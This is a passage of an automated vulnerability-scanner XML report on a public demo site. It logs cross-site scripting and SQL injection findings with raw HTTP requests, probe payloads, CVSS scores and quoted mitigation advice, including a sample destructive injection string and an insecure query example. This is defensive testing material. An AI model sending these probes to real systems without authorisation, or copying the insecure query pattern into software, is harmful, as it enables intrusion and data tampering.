          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="59" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uuname</font></b> was set to <b><font color="dark">kgmwftjg'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;3JE6(9619)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uuname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 236
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=wkamrrkx&amp;uuname=kgmwftjg'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;3JE6(9619)&lt;/ScRiPt&gt;]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:19 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 606
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="60" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">id</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 624=624</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*624*619*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*624 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 624=624 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 624=624 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 624=624 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 624=624 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 624=624 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 624=624 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/AJAX/infotitle.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

id=3%20AND%203*2*1=6%20AND%20624=624]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:21 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 885
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="61" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">id</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infotitle.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/AJAX/infotitle.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
